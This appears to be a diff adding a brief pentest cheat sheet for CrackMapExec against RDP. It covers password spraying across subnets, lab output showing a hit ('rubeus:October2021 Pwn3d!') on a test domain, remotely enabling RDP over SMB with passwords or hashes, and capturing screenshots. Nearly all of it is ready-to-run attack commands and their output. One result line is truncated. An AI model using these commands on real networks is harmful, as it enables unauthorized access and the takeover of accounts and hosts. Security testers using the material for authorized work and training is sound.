@@ -1,1 +1,38 @@
+Password spraying
+RDP password spraying using CrackMapExec
+Password spraying
+crackmapexec rdp 192.168.1.0/24 -u user -p password
+crackmapexec rdp 192.168.133.x -u ron -p October2021
 
+RDP         192.168.133.x 3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:poudlard.wizard)
+RDP         192.168.133.x 3389   DC01             [-] poudlard.wizard\ron:October2021 
+                                                                                                                                                                
+crackmapexec rdp 192.168.133.x -u rubeus -p October2021
+
+RDP         192.168.133.x 3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:poudlard.wizard)
+RDP         192.168.133.x 3389   DC01             [+] poudlard.wizard\rubeus:October2021 (Pwn3d!)
+Password spraying (without bruteforce)
+
+crackmapexec rdp 192.168.1.0/24 -u userfile -p passwordfile --no-bruteforce
+
+Expected Results:
+crackmapexec rdp 192.168.133.x -u /tmp/users -p passwordfile --no-bruteforce
+RDP         192.168.133.x 3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:poudlard.wizard)
+RDP         192.168.133.x 3389   DC01             [-] poudlard.wizard\ron:toto 
+RDP         192.168.133.x 3389   DC01             [-] poudlard.wizard\demo:tata
+RDP         192.168.133.x 3389   DC01             [+] poudlard.wizard\rubeus:October2
+
+Remote and Auto
+Remotely enable RDP using CrackMapExec
+sudo crackmapexec smb 10.69.88.x -u user -p password -M rdp -o ACTION=enable
+
+Enable RDP?
+crackmapexec smb <ip> -u user -H hash -M rdp -o ACTION=enable
+
+Screenshot (connected)
+Using the protocol you can perform RDP screenshots
+crackmapexec rdp <ip> -u <user> -p <password> --screenshot --screentime <second>
+
+Screenshot without NLA (not connected)
+You can perform a screenshot of the login page of the remote host using RDP with CrackMapExec if NLA is disabled
+crackmapexec rdp <ip> --nla-screenshot
